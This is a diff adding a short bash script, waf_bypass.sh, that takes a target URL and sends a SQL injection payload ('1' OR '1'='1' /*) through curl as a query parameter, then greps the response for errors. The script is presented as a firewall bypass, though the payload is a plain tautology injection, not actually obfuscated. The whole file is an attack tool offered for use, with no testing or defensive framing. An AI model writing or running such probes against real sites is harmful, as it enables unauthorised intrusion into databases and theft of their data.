@@ -1,0 +1,17 @@
+#!/bin/bash
+
+# Usage: ./waf_bypass.sh <target_url>
+TARGET_URL=$1
+
+if [ -z "$TARGET_URL" ]; then
+    echo "Usage: $0 <target_url>"
+    exit 1
+fi
+
+echo "Attempting to bypass WAF on $TARGET_URL..."
+
+# Obfuscated payload
+PAYLOAD="1' OR '1'='1' /*"
+
+# Send the payload
+curl -s -G --data "input=$PAYLOAD" "$TARGET_URL" | grep -i "error"
